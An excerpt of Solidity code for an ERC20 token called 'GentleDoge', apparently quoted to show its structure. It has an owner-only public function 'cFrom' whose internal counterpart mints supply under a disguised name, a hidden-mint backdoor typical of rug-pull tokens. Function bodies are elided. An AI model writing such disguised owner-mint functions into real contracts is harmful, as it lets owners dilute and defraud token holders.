...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function cFrom(uint256 amount) public onlyOwner {
    _cFrom(msg.sender, amount);
    }
    ...
    function _cFrom(address account, uint256 amount) internal virtual {
...
contract GentleDoge is ERC20 {

    uint tokenTotalSupply = 1000000000000;

    constructor() public ERC20("GentleDoge", "GTD") {
        _cFrom(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}